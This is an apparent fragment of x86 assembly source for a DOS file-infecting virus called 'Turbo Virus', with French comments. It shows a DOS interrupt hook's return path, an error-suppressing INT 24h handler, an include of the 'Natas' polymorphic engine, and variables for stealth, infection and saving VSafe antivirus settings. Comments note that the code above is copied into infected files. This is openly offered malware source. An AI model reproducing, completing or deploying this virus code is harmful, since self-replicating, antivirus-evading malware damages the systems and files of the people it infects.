	
	;====== Sauvegarde et setting de la pile
	mov cs:[offset sss],ss  ;=== le virus est prevu pour CS=SS=DS
	mov cs:[offset ssp],sp
	push cs
	pop ss
	mov sp,offset newstack

	mov bp,0

	jmp MyInterruptEntryPoint
int21go:                                ;===== On revient ici apres le virus
	;===== remise en etat de la pile
	cli
	push cs:[offset sss]
	pop ss
	mov sp,cs:[offset ssp]
	
	pop ds
	popa
	
	jmp CallDos ;retour au dos normal
Myint21 endp

;===========================================================================
;=========================== INT 24h =======================================
;===========================================================================

MyInt24 proc far
	mov al,3
	iret
MyInt24 endp

;===========================================================================
;=========================== Natas Virus Polymorphic Engine ================
;===========================================================================

include eng.asm

;=================================== Fin du Code du Turbo Virus
;=================================== Ce k'il y a jusk'ici est recopi‚
;=================================== dans les fichiers infectes
;====== Variable a deux francs ;)
TempoPile dw ?

EVEN
file_end:
End_Of_Tvir:

;=================================== Variables temporaires
;=================================== Perdues lors de la recopie
;=================================== Donc attention a ce kon met ici !!!


file_size       equ     file_end - v_start

pointer         dw      ?
disp            dw      ?
encode_ptr      dw      ?
encode_enc_ptr  dw      ?

key_reg         db      ?
count_reg       db      ?
ptr_reg         db      ?
ptr_reg1        db      ?
modify_op       db      ?

write_buff:     db      encode_end-encode dup(?)

o1 dw ?
o2 dw ?
c db ?

;===========================================================================
;=========================== Polymorphic End ===============================
;===========================================================================

;========================= Variables
DtaOfs          DW ?
DtaSeg          DW ?
Handle          DW ?
int24o          DW ?
int24s          DW ?
StartES         DW ?

sss             DW ?            ;======== Sauvegarde de la pile pour le resident
ssp             DW ?

Dummy           DW ?
Dummy2          DW ?

Buf             DB 18h dup (?)  ;== utiliser pour sauver le header des .EXE

Recurse         DB ?
UltraStealth    DB ?
Infectious      DB ?

Counter         DW ?
Counter2        DB ?

OldVSafe        DB ?            ;== vieilles options de VSafe

;=========================== Buffer de sauvegarde pour le jmp de retour
Buf2            DB (offset endsave-offset ReturnFromTsr) dup (?)

;========================= DTA et Pile … moi tout seul
MyDta DB 43 dup (?)

      DB MyStackSize Dup (0)
NewStack:                       ;=== d‚part de Ma pile a moi tout seul

;============== Aire de stockage divers, repertoire de depart
OrgDir  DB 40 Dup (?)
DBVDir  DB 40 Dup (?)

End_Of_Tvir_In_Mem:
;================================== Fin Totale

TVir    ends
	end Start

